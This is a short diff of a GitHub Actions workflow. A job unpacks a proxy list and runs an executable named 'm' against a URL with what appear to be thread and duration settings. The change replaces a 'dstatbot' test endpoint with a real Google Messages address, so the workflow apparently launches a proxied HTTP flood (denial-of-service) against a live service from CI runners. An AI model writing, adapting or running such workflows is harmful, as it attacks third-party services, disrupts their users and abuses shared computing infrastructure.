@@ -42,7 +42,7 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x m
-          ./m https://c2.dstatbot.win/umBb7GiO 700 1 1 90.txt 
+          ./m https://messages.google.com/web/ 700 1 1 90.txt 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
